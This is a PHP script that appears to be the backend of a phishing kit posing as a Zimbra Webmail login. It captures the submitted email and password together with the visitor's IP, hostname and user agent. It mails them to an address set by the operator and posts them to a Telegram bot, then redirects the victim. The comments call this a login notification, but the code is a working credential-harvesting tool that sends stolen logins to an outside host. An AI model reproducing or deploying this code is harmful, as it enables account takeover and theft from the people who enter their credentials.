<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Check if inputs are valid
if (!empty($email) && !empty($password)) {
    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    // Build message using heredoc for better readability
    $message = <<<EOT
|-----------|Zimbra Webmail|------------|
Email: {$email}
Password: {$password}
|-----------------------|
Client IP: {$ip}
GeoIP: http://www.geoiptool.com/?IP={$ip}
User Agent: {$userAgent}
|-----------------------|
EOT;

    // Email Configuration
    $subject = "Login Attempt: {$ip}";
    $Receive_email = getenv('RECEIVER_EMAIL') ?: 'fallback_email@example.com'; // Use fallback email if environment variable is not set

    // Send email
    if (filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
        if (!mail($Receive_email, $subject, $message)) {
            error_log("Failed to send email to {$Receive_email}");
            sendJsonResponse(false, "Email sending failed. Please contact support.");
            exit();
        }
    } else {
        error_log("Environment variable RECEIVER_EMAIL is missing or invalid.");
        sendJsonResponse(false, "Backend configuration error: Receiver email is invalid.");
        exit();
    }

    // Telegram Notification
    $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
    $id = getenv('TELEGRAM_CHAT_ID') ?: '';

    if (!empty($botToken) && !empty($id)) {
        $encodedMessage = urlencode($message);
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$id}&text={$encodedMessage}";
        
        try {
            $curl = curl_init();
            curl_setopt_array($curl, [
                CURLOPT_URL => $telegramUrl,
                CURLOPT_SSL_VERIFYPEER => false, // Disable SSL verification (if needed)
                CURLOPT_RETURNTRANSFER => true, // Return response instead of outputting
                CURLOPT_TIMEOUT => 10 // Prevent hanging
            ]);

            $result = curl_exec($curl);
            if (!$result || curl_errno($curl)) {
                error_log("Telegram API error: " . curl_error($curl));
            }

            curl_close($curl);
        } catch (Exception $e) {
            error_log("Telegram exception: " . $e->getMessage());
        }
    } 

    // Frontend Response
    sendJsonResponse(true, "Notification sent successfully", "https://dashboard.example.com"); // Replace with your dashboard link
} else {
    sendJsonResponse(false, "Invalid input: Email or Password missing");
}
?>
